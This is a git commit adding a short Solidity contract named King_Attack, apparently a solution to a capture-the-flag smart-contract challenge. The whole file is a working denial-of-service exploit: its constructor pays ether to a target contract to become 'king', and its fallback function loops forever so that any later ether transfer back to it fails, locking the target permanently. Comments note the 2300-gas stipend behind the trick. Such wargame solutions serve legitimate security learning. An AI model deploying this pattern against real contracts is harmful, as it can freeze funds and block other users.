1e18c920bd90cde636f45940d9a9faa1e0dc7f51
10ap17 <150276227+10ap17@users.noreply.github.com>
2024-03-12 23:54:37 +0100

    Add files via upload

---
+++ King/King_Attack.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack{
+    constructor(address _addr)payable{
+        payable(_addr).call{value:msg.value}("");
+    }
+        //this level could be passed
+        //with no fallback/receive function
+    fallback() external payable {
+        //transfer is used
+        //there is 2300 of gas to consume
+        while(true){}
+     }
+}
